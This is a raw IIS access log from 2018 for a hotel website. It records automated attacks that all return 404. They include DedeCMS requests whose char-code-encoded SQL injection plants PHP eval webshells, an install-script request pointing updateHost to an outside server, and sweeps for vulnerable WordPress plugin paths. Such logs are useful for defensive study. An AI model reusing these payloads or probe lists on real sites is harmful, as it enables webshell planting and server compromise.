#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-03-08 08:53:04
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-03-08 08:53:04 GET / - 35.162.70.167 HTTP/1.1 Magic+Browser - 200 13729 139
2018-03-09 00:42:55 GET /plus/download.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 404 1405 3457
2018-03-09 00:42:55 GET /plus/ad_js.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 404 1405 1922
2018-03-09 00:42:56 GET /plus/moon.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 404 1405 1914
2018-03-09 00:42:56 GET /plus/download.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 404 1405 4021
2018-03-09 00:42:56 GET /plus/mytag_js.php - 111.178.137.45 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://ngateahotel.co.nz/plus/mytag_js.php?aid=9013 404 1405 305
2018-03-09 00:42:57 POST /plus/90sec.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/plus/90sec.php 404 1405 728
2018-03-09 00:42:57 POST /plus/erraddsave.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/erraddsave.php 404 1405 2380
2018-03-09 00:42:57 GET /plus/advancedsearch.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/advancedsearch.php 404 1405 393
2018-03-09 00:42:57 GET /install/index.php.bak - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/9test.php&updateHost=http://api.test404.com/ 404 1405 593
2018-03-09 00:42:58 POST /data/9test.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/data/9test.php 404 1405 725
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-03-09 04:29:56
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-03-09 04:29:56 GET /robots.txt - 66.249.79.117 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 235
2018-03-09 04:29:56 GET /webapps/i/89914/230892/393108 - 66.249.79.119 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 327
2018-03-09 04:33:32 GET /components/com_sexycontactform/assets/js/index.html - 18.197.118.216 HTTP/1.1 Opera/9.76+(X11;+Linux+i686;+en-US)+Presto/2.9.306+Version/12.00 - 404 1424 191
2018-03-09 04:38:25 GET /wp-content/plugins/cherry-plugin/admin/js/cherry-admin-plugin.js - 18.197.118.216 HTTP/1.1 Opera/9.25+(X11;+Linux+x86_64;+en-US)+Presto/2.11.175+Version/12.00 - 404 1424 207
2018-03-09 04:43:14 GET /wp-content/plugins/mailpress/mp-includes/js/mp_thickbox.js - 18.197.118.216 HTTP/1.1 Opera/8.77+(Windows+NT+5.1;+en-US)+Presto/2.12.180+Version/11.00 - 404 1424 198
2018-03-09 04:47:40 GET /wp-content/plugins/formidable/css/frm_fonts.css - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+5.0;+Windows+98;+Win+9x+4.90;+Trident/3.0) - 404 1424 195
2018-03-09 04:52:13 GET /wp-content/plugins/woocommerce-catalog-enquiry/assets/frontend/css/frontend.css - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+8_2_1+like+Mac+OS+X;+sl-SI)+AppleWebKit/533.26.4+(KHTML,+like+Gecko)+Version/3.0.5+Mobile/8B115+Safari/6533.26.4 - 404 1424 302
2018-03-09 04:57:09 GET /wp-admin/admin-ajax.php - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+8.0;+Windows+95;+Trident/3.0) - 404 1424 218
2018-03-09 05:01:48 GET /wp-content/plugins/dzs-videogallery/admin/admin_global.js - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(Macintosh;+PPC+Mac+OS+X+10_5_1+rv:2.0;+sl-SI)+AppleWebKit/534.42.1+(KHTML,+like+Gecko)+Version/5.1+Safari/534.42.1 - 404 1424 260
2018-03-09 05:06:10 GET /wp-content/plugins/php-event-calendar/js/file-uploader/app.js - 18.197.118.216 HTTP/1.1 Opera/9.14+(X11;+Linux+i686;+sl-SI)+Presto/2.8.211+Version/10.00 - 404 1424 201
2018-03-09 05:10:42 GET /wp-content/plugins/accesspress-anonymous-post-pro/js/admin-extra.js - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+7.0;+Windows+95;+Trident/3.1) - 404 1424 202
2018-03-09 05:15:44 GET /wp-content/plugins/advanced-ajax-page-loader/reload_code.js - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+5.2;+Trident/4.1) - 404 1424 198
2018-03-09 05:20:46 GET /wp-content/plugins/real3d-flipbook/js/share.min.js - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(Windows;+U;+Windows+NT+5.2)+AppleWebKit/534.33.5+(KHTML,+like+Gecko)+Version/5.0.1+Safari/534.33.5 - 404 1424 237
2018-03-09 05:25:09 GET /wp-content/plugins/wp-support-plus-responsive-ticket-system/asset/js/admin.js - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(Windows+NT+6.2)+AppleWebKit/5352+(KHTML,+like+Gecko)+Chrome/38.0.845.0+Mobile+Safari/5352 - 404 1424 255
2018-03-09 05:30:02 GET /wp-content/plugins/cardoza-facebook-like-box/admin_cardozafacebook.css - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(Windows+NT+4.0;+en-US;+rv:1.9.1.20)+Gecko/20120417+Firefox/35.0 - 404 1424 222
2018-03-09 05:34:44 GET /modules/pk_flexmenu/config.xml - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+11.0;+Windows+NT+5.01;+Trident/5.0) - 404 1424 171
2018-03-09 05:39:22 GET /modules/pk_vertflexmenu/config.xml - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(X11;+Linux+i686;+rv:5.0)+Gecko/20130410+Firefox/35.0 - 404 1424 175
2018-03-09 05:44:23 GET /modules/homepageadvertise2/config.xml - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(X11;+Linux+x86_64;+rv:6.0)+Gecko/20110114+Firefox/36.0 - 404 1424 180
2018-03-09 05:49:08 GET /modules/fieldvmegamenu/config.xml - 18.197.118.216 HTTP/1.1 Mozilla/5.0+(Macintosh;+U;+Intel+Mac+OS+X+10_6_3+rv:2.0;+en-US)+AppleWebKit/533.22.6+(KHTML,+like+Gecko)+Version/4.0.4+Safari/533.22.6 - 404 1424 243
